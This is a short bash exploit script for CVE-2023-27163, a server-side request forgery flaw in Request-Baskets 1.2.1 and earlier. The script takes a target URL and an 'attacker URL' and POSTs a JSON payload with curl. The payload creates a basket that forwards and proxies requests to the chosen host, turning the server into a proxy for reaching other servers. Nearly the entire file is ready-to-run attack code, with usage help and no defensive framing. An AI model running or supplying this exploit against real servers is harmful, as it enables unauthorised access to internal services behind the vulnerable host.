#!/bin/bash


#    ███████████   █████  █████ ███████████  █████    ███████       █████     ████████ 
#   ░░███░░░░░███ ░░███  ░░███ ░░███░░░░░███░░███   ███░░░░░███   ███░░░███  ███░░░░███
#    ░███    ░███  ░███   ░███  ░███    ░███ ░███  ███     ░░███ ███   ░░███░░░    ░███
#    ░██████████   ░███   ░███  ░██████████  ░███ ░███      ░███░███    ░███   ███████ 
#    ░███░░░░░███  ░███   ░███  ░███░░░░░███ ░███ ░███      ░███░███    ░███  ███░░░░  
#    ░███    ░███  ░███   ░███  ░███    ░███ ░███ ░░███     ███ ░░███   ███  ███      █
#    █████   █████ ░░████████   ███████████  █████ ░░░███████░   ░░░█████░  ░██████████
#   ░░░░░   ░░░░░   ░░░░░░░░   ░░░░░░░░░░░  ░░░░░    ░░░░░░░       ░░░░░░   ░░░░░░░░░░ 

       
#   COLOURS
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#   HELP
function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Use: ./CVE-2023-27163.sh -t <TARGET_URL> -a <ATTACKER_URL>${endColour}"
	echo -e "\n\n${purpleColour}${endColour}${yellowColour}This a exploit will create a vulnerable basket on a Request-Baskets (<= 1.2.1)\nserver which will act as a proxy to other servers.${endColour}"
	echo -e "\n${purpleColour}ARGUMENTS:${endColour}"
    echo -e "\n\t${redColour}TARGET_URL       The R-BASKET server url (eg. http://127.0.0.1:55555/ )${endColour}"
	echo -e "\n\t${redColour}ATTACKER_URL     Server to which the request is forwarded (eg. http://127.0.0.1:80/ )${endColour}"
	exit 0
}

#   EXPLOIT
function startAttack(){
    if [ "${target_url: -1}" != "/" ]; then
        target_url="$target_url/";
    fi;
    
    BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6")
    API_URL=${target_url}"api/baskets/${BASKET_NAME}"
    PAYLOAD="{\"forward_url\": \"${attacker_url}\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}"
    echo -e "${grayColour}>>${endColour} ${purpleColour}Creating the basket:${endColour} \"$BASKET_NAME\""
    if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then
        echo -e "${grayColour}>>${endColour} ${redColour}Could not properly request${endColour} $API_URL${redColour}. Is the server online?${endColour}"
        exit 1
    fi;
    BASKET_URL="$target_url$BASKET_NAME"
    echo -e "${grayColour}>>${endColour} ${greenColour}Basket created! -> ${endColour}${BASKET_URL}"
    exit 0
}


#   MAIN EXPLOIT
declare -i parameter_counter=0; while getopts ":t:a:h:" arg; do
		case $arg in
			t) target_url=$OPTARG; let parameter_counter+=1 ;;
			a) attacker_url=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
done
if [ $parameter_counter -ne 2 ]; then
	helpPanel
else
	startAttack
fi